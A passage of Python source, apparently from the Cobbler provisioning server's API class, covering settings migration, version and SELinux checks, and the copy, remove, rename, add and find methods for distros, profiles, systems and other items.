utils.load_signatures(self.settings().signature_path)\n            except Exception as e:\n                self.log(\"Failed to load signatures from %s: %s\" % (self.settings().signature_path, e))\n                return\n\n            self._collection_mgr = manager.CollectionManager(self)\n            self.deserialize()\n\n            self.log(\"%d breeds and %d OS versions read from the signature file\"\n                     % (len(utils.get_valid_breeds()), len(utils.get_valid_os_versions())))\n\n            self.authn = self.get_module_from_file(\n                \"authentication\",\n                \"module\",\n                \"authn_configfile\"\n            )\n            self.authz = self.get_module_from_file(\n                \"authorization\",\n                \"module\",\n                \"authz_allowall\"\n            )\n\n            # FIXME: pass more loggers around, and also see that those using things via tasks construct their own\n            #  yumgen/tftpgen versus reusing this one, which has the wrong logger (most likely) for background tasks.\n\n            self.autoinstallgen = autoinstallgen.AutoInstallationGen(self._collection_mgr)\n            self.yumgen = yumgen.YumGen(self._collection_mgr)\n            self.tftpgen = tftpgen.TFTPGen(self._collection_mgr)\n            self.power_mgr = power_manager.PowerManager(self, self._collection_mgr)\n            self.logger.debug(\"API handle initialized\")\n            self.perms_ok = True\n\n    def __generate_settings(self, settings_path: Path,\n                            execute_settings_automigration: bool = True) -> settings.Settings:\n        # Read in YAML file and get dict\n        yaml_dict = settings.read_yaml_file(settings_path)\n\n        # Add or update auto migrate settings value\n        yaml_dict[\"auto_migrate_settings\"] = execute_settings_automigration\n\n        # Take dict and use it in migrations\n        migrated_settings = settings.migrate(yaml_dict, settings_path)\n\n        # After the migration is done, save result in the settings object\n        new_settings = settings.Settings()\n        new_settings.from_dict(migrated_settings)\n\n        # save to disk\n        new_settings.save(settings_path)\n\n        # Return object\n        return new_settings\n\n    # ==========================================================\n\n    def is_selinux_enabled(self) -> bool:\n        \"\"\"\n        Returns whether selinux is enabled on the Cobbler server.\n        We check this just once at Cobbler API init time, because a restart is required to change this; this does\n        /not/ check enforce/permissive, nor does it need to.\n        \"\"\"\n        return self.selinux_enabled\n\n    def is_selinux_supported(self) -> bool:\n        \"\"\"\n        Returns whether or not the OS is sufficient enough to run with SELinux enabled (currently EL 5 or later).\n\n        :returns: False per default. If Distro is Redhat and Version >= 5 then it returns true.\n        \"\"\"\n        # FIXME: This detection is flawed. There is more than just Rhel with selinux and the original implementation was\n        #        too broad.\n        if (\"red hat\" in self.dist or \"redhat\" in self.dist) and self.os_version >= 5:\n            return True\n        # doesn't support public_content_t\n        return False\n\n    # ==========================================================\n\n    def last_modified_time(self) -> float:\n        \"\"\"\n        Returns the time of the last modification to Cobbler, made by any API instance, regardless of the serializer\n        type.\n\n        :returns: 0 if there is no file where the information required for this method is saved.\n        \"\"\"\n        # FIXME: This fails in case the file required is not available\n        if not os.path.exists(\"/var/lib/cobbler/.mtime\"):\n            fd = open(\"/var/lib/cobbler/.mtime\", 'w')\n            fd.write(\"0\")\n            fd.close()\n            return float(0)\n        fd = open(\"/var/lib/cobbler/.mtime\", 'r')\n        data = fd.read().strip()\n        return float(data)\n\n    # ==========================================================\n\n    def log(self, msg: str, args=None, debug: bool = False):\n        \"\"\"\n        Logs a message with the already initiated logger of this object.\n\n        :param msg: The message to log.\n        :param args: Optional message which gets appended to the main msg with a ';'.\n        :param debug: Weather the logged message is a debug message (true) or info (false).\n\n        .. deprecated:: 3.3.0\n           We should use the standard logger.\n        \"\"\"\n        if debug:\n            logger = self.logger.debug\n        else:\n            logger = self.logger.info\n        if args is None:\n            logger(\"%s\" % msg)\n        else:\n            logger(\"%s; %s\" % (msg, str(args)))\n\n    # ==========================================================\n\n    def version(self, extended: bool = False) -> Union[float, Dict[str, Union[str, list]]]:\n        \"\"\"\n        What version is Cobbler?\n\n        If extended == False, returns a float for backwards compatibility\n        If extended == True, returns a dict:\n\n            gitstamp      -- the last git commit hash\n            gitdate       -- the last git commit date on the builder machine\n            builddate     -- the time of the build\n            version       -- something like \"1.3.2\"\n            version_tuple -- something like [ 1, 3, 2 ]\n\n        :param extended: False returns a float, True a Dictionary.\n        \"\"\"\n        config = ConfigParser()\n        config.read(\"/etc/cobbler/version\")\n        data: Dict[str, Union[str, list]] = {\n            \"gitdate\": config.get(\"cobbler\", \"gitdate\"),\n            \"gitstamp\": config.get(\"cobbler\", \"gitstamp\"),\n            \"builddate\": config.get(\"cobbler\", \"builddate\"),\n            \"version\": config.get(\"cobbler\", \"version\"),\n            \"version_tuple\": []\n        }\n        # dont actually read the version_tuple from the version file\n        for num in data[\"version\"].split(\".\"):\n            data[\"version_tuple\"].append(int(num))\n\n        if not extended:\n            # for backwards compatibility and use with koan's comparisons\n            elems = data[\"version_tuple\"]\n            return int(elems[0]) + 0.1 * int(elems[1]) + 0.001 * int(elems[2])\n        else:\n            return data\n\n    # ==========================================================\n\n    def get_item(self, what: str, name: str):\n        \"\"\"\n        Get a general item.\n\n        :param what: The item type to retrieve from the internal database.\n        :param name: The name of the item to retrieve.\n        :return: An item of the desired type.\n        \"\"\"\n        # self.log(\"get_item\", [what, name], debug=True)\n        item = self._collection_mgr.get_items(what).get(name)\n        return item\n\n    def get_items(self, what: str):\n        \"\"\"\n        Get all items of a collection.\n\n        :param what: The collection to query.\n        :return: The items which were queried. May return no items.\n        \"\"\"\n        # self.log(\"get_items\", [what], debug=True)\n        items = self._collection_mgr.get_items(what)\n        return items\n\n    def distros(self):\n        \"\"\"\n        Return the current list of distributions\n        \"\"\"\n        return self.get_items(\"distro\")\n\n    def profiles(self):\n        \"\"\"\n        Return the current list of profiles\n        \"\"\"\n        return self.get_items(\"profile\")\n\n    def systems(self):\n        \"\"\"\n        Return the current list of systems\n        \"\"\"\n        return self.get_items(\"system\")\n\n    def repos(self):\n        \"\"\"\n        Return the current list of repos\n        \"\"\"\n        return self.get_items(\"repo\")\n\n    def images(self):\n        \"\"\"\n        Return the current list of images\n        \"\"\"\n        return self.get_items(\"image\")\n\n    def settings(self):\n        \"\"\"\n        Return the application configuration\n        \"\"\"\n        return self._settings\n\n    def mgmtclasses(self):\n        \"\"\"\n        Return the current list of mgmtclasses\n        \"\"\"\n        return self.get_items(\"mgmtclass\")\n\n    def packages(self):\n        \"\"\"\n        Return the current list of packages\n        \"\"\"\n        return self.get_items(\"package\")\n\n    def files(self):\n        \"\"\"\n        Return the current list of files\n        \"\"\"\n        return self.get_items(\"file\")\n\n    def menus(self):\n        \"\"\"\n        Return the current list of menus\n        \"\"\"\n        return self.get_items(\"menu\")\n\n    # =======================================================================\n\n    def copy_item(self, what: str, ref, newname: str):\n        \"\"\"\n        General copy method which is called by the specific methods.\n\n        :param what: The collection type which gets copied.\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.log(\"copy_item(%s)\" % what, [ref.name, newname])\n        self.get_items(what).copy(ref, newname)\n\n    def copy_distro(self, ref, newname: str):\n        \"\"\"\n        This method copies a distro which is just different in the name of the object.\n\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.copy_item(\"distro\", ref, newname)\n\n    def copy_profile(self, ref, newname: str):\n        \"\"\"\n        This method copies a profile which is just different in the name of the object.\n\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.copy_item(\"profile\", ref, newname)\n\n    def copy_system(self, ref, newname: str):\n        \"\"\"\n        This method copies a system which is just different in the name of the object.\n\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.copy_item(\"system\", ref, newname)\n\n    def copy_repo(self, ref, newname: str):\n        \"\"\"\n        This method copies a repository which is just different in the name of the object.\n\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.copy_item(\"repo\", ref, newname)\n\n    def copy_image(self, ref, newname: str):\n        \"\"\"\n        This method copies an image which is just different in the name of the object.\n\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.copy_item(\"image\", ref, newname)\n\n    def copy_mgmtclass(self, ref, newname: str):\n        \"\"\"\n        This method copies a management class which is just different in the name of the object.\n\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.copy_item(\"mgmtclass\", ref, newname)\n\n    def copy_package(self, ref, newname: str):\n        \"\"\"\n        This method copies a package which is just different in the name of the object.\n\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.copy_item(\"package\", ref, newname)\n\n    def copy_file(self, ref, newname: str):\n        \"\"\"\n        This method copies a file which is just different in the name of the object.\n\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.copy_item(\"file\", ref, newname)\n\n    def copy_menu(self, ref, newname: str):\n        \"\"\"\n        This method copies a file which is just different in the name of the object.\n\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.copy_item(\"menu\", ref, newname)\n\n    # ==========================================================================\n\n    def remove_item(self, what: str, ref, recursive: bool = False, delete: bool = True, with_triggers: bool = True):\n        \"\"\"\n        Remove a general item. This method should not be used by an external api. Please use the specific\n        remove_<itemtype> methods.\n\n        :param what: The type of the item.\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        if isinstance(what, str):\n            if isinstance(ref, str):\n                ref = self.get_item(what, ref)\n                if ref is None:\n                    return  # nothing to remove\n        self.log(\"remove_item(%s)\" % what, [ref.name])\n        self.get_items(what).remove(ref.name, recursive=recursive, with_delete=delete, with_triggers=with_triggers)\n\n    def remove_distro(self, ref, recursive: bool = False, delete: bool = True, with_triggers: bool = True):\n        \"\"\"\n        Remove a distribution from Cobbler.\n\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        self.remove_item(\"distro\", ref, recursive=recursive, delete=delete, with_triggers=with_triggers)\n\n    def remove_profile(self, ref, recursive: bool = False, delete: bool = True, with_triggers: bool = True):\n        \"\"\"\n        Remove a profile from Cobbler.\n\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        self.remove_item(\"profile\", ref, recursive=recursive, delete=delete, with_triggers=with_triggers)\n\n    def remove_system(self, ref, recursive: bool = False, delete: bool = True, with_triggers: bool = True):\n        \"\"\"\n        Remove a system from Cobbler.\n\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        self.remove_item(\"system\", ref, recursive=recursive, delete=delete, with_triggers=with_triggers)\n\n    def remove_repo(self, ref, recursive: bool = False, delete: bool = True, with_triggers: bool = True):\n        \"\"\"\n        Remove a repository from Cobbler.\n\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        self.remove_item(\"repo\", ref, recursive=recursive, delete=delete, with_triggers=with_triggers)\n\n    def remove_image(self, ref, recursive: bool = False, delete: bool = True, with_triggers: bool = True):\n        \"\"\"\n        Remove a image from Cobbler.\n\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        self.remove_item(\"image\", ref, recursive=recursive, delete=delete, with_triggers=with_triggers)\n\n    def remove_mgmtclass(self, ref, recursive: bool = False, delete: bool = True, with_triggers: bool = True):\n        \"\"\"\n        Remove a management class from Cobbler.\n\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        self.remove_item(\"mgmtclass\", ref, recursive=recursive, delete=delete, with_triggers=with_triggers)\n\n    def remove_package(self, ref, recursive: bool = False, delete: bool = True, with_triggers: bool = True):\n        \"\"\"\n        Remove a package from Cobbler.\n\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        self.remove_item(\"package\", ref, recursive=recursive, delete=delete, with_triggers=with_triggers)\n\n    def remove_file(self, ref, recursive: bool = False, delete: bool = True, with_triggers: bool = True):\n        \"\"\"\n        Remove a file from Cobbler.\n\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        self.remove_item(\"file\", ref, recursive=recursive, delete=delete, with_triggers=with_triggers)\n\n    def remove_menu(self, ref, recursive=False, delete=True, with_triggers=True):\n        \"\"\"\n        Remove a menu from Cobbler.\n\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        self.remove_item(\"menu\", ref, recursive=recursive, delete=delete, with_triggers=with_triggers)\n\n    # ==========================================================================\n\n    def rename_item(self, what: str, ref, newname: str):\n        \"\"\"\n        Remove a general item. This method should not be used by an external api. Please use the specific\n        rename_<itemtype> methods.\n\n        :param what: The type of object which should be renamed.\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.log(\"rename_item(%s)\" % what, [ref.name, newname])\n        self.get_items(what).rename(ref, newname)\n\n    def rename_distro(self, ref, newname: str):\n        \"\"\"\n        Rename a distro to a new name.\n\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.rename_item(\"distro\", ref, newname)\n\n    def rename_profile(self, ref, newname: str):\n        \"\"\"\n        Rename a profile to a new name.\n\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.rename_item(\"profile\", ref, newname)\n\n    def rename_system(self, ref, newname: str):\n        \"\"\"\n        Rename a system to a new name.\n\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.rename_item(\"system\", ref, newname)\n\n    def rename_repo(self, ref, newname: str):\n        \"\"\"\n        Rename a repository to a new name.\n\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.rename_item(\"repo\", ref, newname)\n\n    def rename_image(self, ref, newname: str):\n        \"\"\"\n        Rename an image to a new name.\n\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.rename_item(\"image\", ref, newname)\n\n    def rename_mgmtclass(self, ref, newname: str):\n        \"\"\"\n        Rename a management class to a new name.\n\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.rename_item(\"mgmtclass\", ref, newname)\n\n    def rename_package(self, ref, newname: str):\n        \"\"\"\n        Rename a package to a new name.\n\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.rename_item(\"package\", ref, newname)\n\n    def rename_file(self, ref, newname: str):\n        \"\"\"\n        Rename a file to a new name.\n\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.rename_item(\"file\", ref, newname)\n\n    def rename_menu(self, ref, newname: str):\n        \"\"\"\n        Rename a menu to a new name.\n\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.rename_item(\"menu\", ref, newname)\n\n    # ==========================================================================\n\n    # FIXME: add a new_item method\n\n    def new_distro(self, is_subobject: bool = False):\n        \"\"\"\n        Returns a new empty distro object. This distro is not automatically persisted. Persistance is achieved via\n        ``save()``.\n\n        :param is_subobject: If the object created is a subobject or not.\n        :return: An empty Distro object.\n        \"\"\"\n        self.log(\"new_distro\", [is_subobject])\n        return distro.Distro(self._collection_mgr, is_subobject=is_subobject)\n\n    def new_profile(self, is_subobject: bool = False):\n        \"\"\"\n        Returns a new empty profile object. This profile is not automatically persisted. Persistence is achieved via\n        ``save()``.\n\n        :param is_subobject: If the object created is a subobject or not.\n        :return: An empty Profile object.\n        \"\"\"\n        self.log(\"new_profile\", [is_subobject])\n        return profile.Profile(self._collection_mgr, is_subobject=is_subobject)\n\n    def new_system(self, is_subobject: bool = False):\n        \"\"\"\n        Returns a new empty system object. This system is not automatically persisted. Persistence is achieved via\n        ``save()``.\n\n        :param is_subobject: If the object created is a subobject or not.\n        :return: An empty System object.\n        \"\"\"\n        self.log(\"new_system\", [is_subobject])\n        return system.System(self._collection_mgr, is_subobject=is_subobject)\n\n    def new_repo(self, is_subobject: bool = False):\n        \"\"\"\n        Returns a new empty repo object. This repository is not automatically persisted. Persistence is achieved via\n        ``save()``.\n\n        :param is_subobject: If the object created is a subobject or not.\n        :return: An empty repo object.\n        \"\"\"\n        self.log(\"new_repo\", [is_subobject])\n        return repo.Repo(self._collection_mgr, is_subobject=is_subobject)\n\n    def new_image(self, is_subobject: bool = False):\n        \"\"\"\n        Returns a new empty image object. This image is not automatically persisted. Persistence is achieved via\n        ``save()``.\n\n        :param is_subobject: If the object created is a subobject or not.\n        :return: An empty image object.\n        \"\"\"\n        self.log(\"new_image\", [is_subobject])\n        return image.Image(self._collection_mgr, is_subobject=is_subobject)\n\n    def new_mgmtclass(self, is_subobject: bool = False):\n        \"\"\"\n        Returns a new empty mgmtclass object. This mgmtclass is not automatically persisted. Persistence is achieved via\n        ``save()``.\n\n        :param is_subobject: If the object created is a subobject or not.\n        :return: An empty mgmtclass object.\n        \"\"\"\n        self.log(\"new_mgmtclass\", [is_subobject])\n        return mgmtclass.Mgmtclass(self._collection_mgr, is_subobject=is_subobject)\n\n    def new_package(self, is_subobject: bool = False):\n        \"\"\"\n        Returns a new empty package object. This package is not automatically persisted. Persistence is achieved via\n        ``save()``.\n\n        :param is_subobject: If the object created is a subobject or not.\n        :return: An empty Package object.\n        \"\"\"\n        self.log(\"new_package\", [is_subobject])\n        return package.Package(self._collection_mgr, is_subobject=is_subobject)\n\n    def new_file(self, is_subobject: bool = False):\n        \"\"\"\n        Returns a new empty file object. This file is not automatically persisted. Persistence is achieved via\n        ``save()``.\n\n        :param is_subobject: If the object created is a subobject or not.\n        :return: An empty File object.\n        \"\"\"\n        self.log(\"new_file\", [is_subobject])\n        return file.File(self._collection_mgr, is_subobject=is_subobject)\n\n    def new_menu(self, is_subobject: bool = False):\n        \"\"\"\n        Returns a new empty menu object. This file is not automatically persisted. Persistence is achieved via\n        ``save()``.\n\n        :param is_subobject: If the object created is a subobject or not.\n        :return: An empty File object.\n        \"\"\"\n        self.log(\"new_menu\", [is_subobject])\n        return menu.Menu(self._collection_mgr, is_subobject=is_subobject)\n\n    # ==========================================================================\n\n    def add_item(self, what: str, ref, check_for_duplicate_names: bool = False, save: bool = True):\n        \"\"\"\n        Add an abstract item to a collection of its specific items. This is not meant for external use. Please reefer\n        to one of the specific methods ``add_<type>``.\n\n        :param what: The item type.\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.log(\"add_item(%s)\" % what, [ref.name])\n        self.get_items(what).add(ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    def add_distro(self, ref, check_for_duplicate_names: bool = False, save: bool = True):\n        \"\"\"\n        Add a distribution to Cobbler.\n\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.add_item(\"distro\", ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    def add_profile(self, ref, check_for_duplicate_names: bool = False, save: bool = True):\n        \"\"\"\n        Add a profile to Cobbler.\n\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.add_item(\"profile\", ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    def add_system(self, ref, check_for_duplicate_names: bool = False, check_for_duplicate_netinfo=False,\n                   save: bool = True):\n        \"\"\"\n        Add a system to Cobbler.\n\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param check_for_duplicate_netinfo: If the name of the network interface should be unique or can be present\n                                            multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.add_item(\"system\", ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    def add_repo(self, ref, check_for_duplicate_names: bool = False, save: bool = True):\n        \"\"\"\n        Add a repository to Cobbler.\n\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.add_item(\"repo\", ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    def add_image(self, ref, check_for_duplicate_names: bool = False, save: bool = True):\n        \"\"\"\n        Add an image to Cobbler.\n\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.add_item(\"image\", ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    def add_mgmtclass(self, ref, check_for_duplicate_names: bool = False, save: bool = True):\n        \"\"\"\n        Add a management class to Cobbler.\n\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.add_item(\"mgmtclass\", ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    def add_package(self, ref, check_for_duplicate_names: bool = False, save: bool = True):\n        \"\"\"\n        Add a package to Cobbler.\n\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.add_item(\"package\", ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    def add_file(self, ref, check_for_duplicate_names: bool = False, save: bool = True):\n        \"\"\"\n        Add a file to Cobbler.\n\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.add_item(\"file\", ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    def add_menu(self, ref, check_for_duplicate_names=False, save=True):\n        \"\"\"\n        Add a submenu to Cobbler.\n\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.add_item(\"menu\", ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    # ==========================================================================\n\n    def find_items(self, what: str, criteria: dict = None, name: str = \"\", return_list: bool = True,\n                   no_errors: bool = False):\n        \"\"\"\n        This is the abstract base method for finding object int the api. It should not be used by external resources.\n        Please reefer to the specific implementations of this method called ``find_<object type>``.\n\n        :param what: The object type of the item to search for.\n        :param criteria: The dictionary with the key-value pairs to find objects with.\n        :param name: The name of the object.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :return: The list of items witch match the search criteria.\n        \"\"\"\n        # self.log(\"find_items\", [what])\n        if criteria is None:\n            criteria = {}\n\n        if what == \"\" and (\"name\" in criteria or name is not None):\n            return self.__find_by_name(criteria.get(\"name\", name))\n\n        if what not in [\"distro\", \"profile\", \"system\", \"repo\", \"image\", \"mgmtclass\", \"package\", \"file\", \"menu\"]:\n            raise ValueError(\"what needs to be a valid collection!\")\n\n        items = self._collection_mgr.get_items(what)\n        return items.find(name=name, return_list=return_list, no_errors=no_errors, **criteria)\n\n    def __find_by_name(self, name: str):\n        \"\"\"\n        This is a magic method which just searches all collections for the specified name directly,\n        :param name: The name of the item(s).\n        :return: The found item or None.\n        \"\"\"\n        if not isinstance(name, str):\n            raise TypeError(\"name of an object must be of type str!\")\n        collections = [\"distro\", \"profile\", \"system\", \"repo\", \"image\", \"mgmtclass\", \"package\", \"file\", \"menu\"]\n        for collection_name in collections:\n            match = self.find_items(collection_name, name=name, return_list=False)\n            if match is not None:\n                return match\n        return None\n\n    def find_distro(self, name: str = \"\", return_list=False, no_errors=False, **kargs):\n        \"\"\"\n        Find a distribution via a name or keys specified in the ``**kargs``.\n\n        :param name: The name to search for.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :param kargs: Additional key-value pairs which may help in finding the desired objects.\n        :return: A single object or a list of all search results.\n        \"\"\"\n        return self._collection_mgr.distros().find(name=name, return_list=return_list, no_errors=no_errors, **kargs)\n\n    def find_profile(self, name: str = \"\", return_list=False, no_errors=False, **kargs):\n        \"\"\"\n        Find a profile via a name or keys specified in the ``**kargs``.\n\n        :param name: The name to search for.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :param kargs: Additional key-value pairs which may help in finding the desired objects.\n        :return: A single object or a list of all search results.\n        \"\"\"\n        return self._collection_mgr.profiles().find(name=name, return_list=return_list, no_errors=no_errors, **kargs)\n\n    def find_system(self, name: str = \"\", return_list=False, no_errors=False, **kargs):\n        \"\"\"\n        Find a system via a name or keys specified in the ``**kargs``.\n\n        :param name: The name to search for.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :param kargs: Additional key-value pairs which may help in finding the desired objects.\n        :return: A single object or a list of all search results.\n        \"\"\"\n        return self._collection_mgr.systems().find(name=name, return_list=return_list, no_errors=no_errors, **kargs)\n\n    def find_repo(self, name: str = \"\", return_list=False, no_errors=False, **kargs):\n        \"\"\"\n        Find a repository via a name or keys specified in the ``**kargs``.\n\n        :param name: The name to search for.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :param kargs: Additional key-value pairs which may help in finding the desired objects.\n        :return: A single object or a list of all search results.\n        \"\"\"\n        return self._collection_mgr.repos().find(name=name, return_list=return_list, no_errors=no_errors, **kargs)\n\n    def find_image(self, name: str = \"\", return_list=False, no_errors=False, **kargs):\n        \"\"\"\n        Find an image via a name or keys specified in the ``**kargs``.\n\n        :param name: The name to search for.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :param kargs: Additional key-value pairs which may help in finding the desired objects.\n        :return: A single object or a list of all search results.\n        \"\"\"\n        return self._collection_mgr.images().find(name=name, return_list=return_list, no_errors=no_errors, **kargs)\n\n    def find_mgmtclass(self, name: str = \"\", return_list=False, no_errors=False, **kargs):\n        \"\"\"\n        Find a management class via a name or keys specified in the ``**kargs``.\n\n        :param name: The name to search for.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :param kargs: Additional key-value pairs which may help in finding the desired objects.\n        :return: A single object or a list of all search results.\n        \"\"\"\n        return self._collection_mgr.mgmtclasses().find(name=name, return_list=return_list, no_errors=no_errors, **kargs)\n\n    def find_package(self, name: str = \"\", return_list=False, no_errors=False, **kargs):\n        \"\"\"\n        Find a package via a name or keys specified in the ``**kargs``.\n\n        :param name: The name to search for.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :param kargs: Additional key-value pairs which may help in finding the desired objects.\n        :return: A single object or a list of all search results.\n        \"\"\"\n        return self._collection_mgr.packages().find(name=name, return_list=return_list, no_errors=no_errors, **kargs)\n\n    def find_file(self, name: str = \"\", return_list=False, no_errors=False, **kargs):\n        \"\"\"\n        Find a file via a name or keys specified in the ``**kargs``.\n\n        :param name: The name to search for.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :param kargs: Additional key-value pairs which may help in finding the desired objects.\n        :return: A single object or a list of all search results.\n        \"\"\"\n        return self._collection_mgr.files().find(name=name, return_list=return_list, no_errors=no_errors, **kargs)\n\n    def find_menu(self, name: str = \"\", return_list=False, no_errors=False, **kargs):\n        \"\"\"\n        Find a menu via a name or keys specified in the ``**kargs``.\n\n        :param name: The name to search for.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :param kargs: Additional key-value pairs which may help in finding the desired objects.\n        :return: A single object or a list of all search results.\n        \"\"\"\n        return self._collection_mgr.menus().find(name=name, return_list=return_list, no_errors=no_errors, **kargs)\n\n    # ==========================================================================\n\n    def __since(self, mtime: float, collector, collapse: bool = False) -> list:\n        \"\"\"\n        Called by get_*_since functions. This is an internal part of Cobbler.\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collector: The list of objects to filter after mtime.\n        :param collapse: Whether the object should be collapsed to a dict or not. If not the item objects are used for\n                         the list.\n        :return: The list of objects which are newer then the given timestamp.\n        \"\"\"\n        results1 = collector()\n        results2 = []\n        for x in results1:\n            if x.mtime == 0 or x.mtime >= mtime:\n                if not collapse:\n                    results2.append(x)\n                else:\n                    results2.append(x.to_dict())\n        return results2\n\n    def get_distros_since(self, mtime: float, collapse: bool = False):\n        \"\"\"\n        Returns distros modified since a certain time (in seconds since Epoch)\n\n        :param mtime: The timestamp which marks the gate if an object is 